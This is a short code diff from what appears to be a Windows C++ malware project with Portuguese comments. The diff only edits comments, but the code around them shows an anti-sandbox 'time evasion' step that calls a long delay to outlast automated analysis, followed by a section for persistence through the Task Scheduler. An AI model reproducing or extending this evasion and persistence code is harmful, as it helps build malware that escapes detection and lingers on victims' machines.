@@ -1,4 +1,4 @@
-#include <winsock2.h>    // OBRIGATÓRIO SER O PRIMEIRO
+#include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <iostream>
@@ -27,7 +27,7 @@ int main() {
         return 0; 
     }
 
-    // --- 3. EVASÃO POR TEMPO (HEAVY DELAY) ---
+    // --- 3. EVASÃO POR TEMPO ---
     AntiSandbox::ExecuteHeavyDelay(120000000); 
 
     // --- 4. PERSISTÊNCIA (TASK SCHEDULER) ---
